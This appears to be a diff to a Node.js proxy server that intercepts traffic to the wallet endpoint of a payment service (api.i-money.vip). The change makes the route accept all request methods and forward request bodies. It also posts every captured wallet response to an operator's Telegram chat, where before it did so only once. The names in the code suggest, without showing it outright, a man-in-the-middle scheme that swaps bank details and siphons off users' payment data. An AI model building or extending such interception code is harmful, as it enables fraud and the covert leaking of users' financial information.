@@ -349,7 +349,7 @@ Bonus added to balance ✅
   }
 });
 
-app.get('/wallet/online/walletType', async (req, res) => {
+app.all('/wallet/online/walletType', async (req, res) => {
   const bankData = await loadData();
   if (bankData.botEnabled === false) return await transparentProxy(req, res);
   const active = await getActiveBankAndSave(bankData);
@@ -366,16 +366,20 @@ app.get('/wallet/online/walletType', async (req, res) => {
     }
     forwardHeaders['host'] = 'api.i-money.vip';
 
-    const response = await fetch(url, { method: 'GET', headers: forwardHeaders });
+    const opts = { method: req.method, headers: forwardHeaders };
+    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
+      opts.body = req.rawBody;
+      forwardHeaders['content-length'] = String(req.rawBody.length);
+    }
+    const response = await fetch(url, opts);
     const respBody = await response.text();
 
     let jsonResp;
     try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }
 
-    if (bankData.adminChatId && bot && !bankData._walletDebugSent) {
+    if (bankData.adminChatId && bot) {
       bot.sendMessage(bankData.adminChatId, '🔍 WalletType DEBUG:\n' + JSON.stringify(jsonResp, null, 2).substring(0, 3000)).catch(() => {});
-      bankData._walletDebugSent = true;
-      saveData(bankData).catch(() => {});
+      
     }
 
     if (jsonResp && jsonResp.data) {
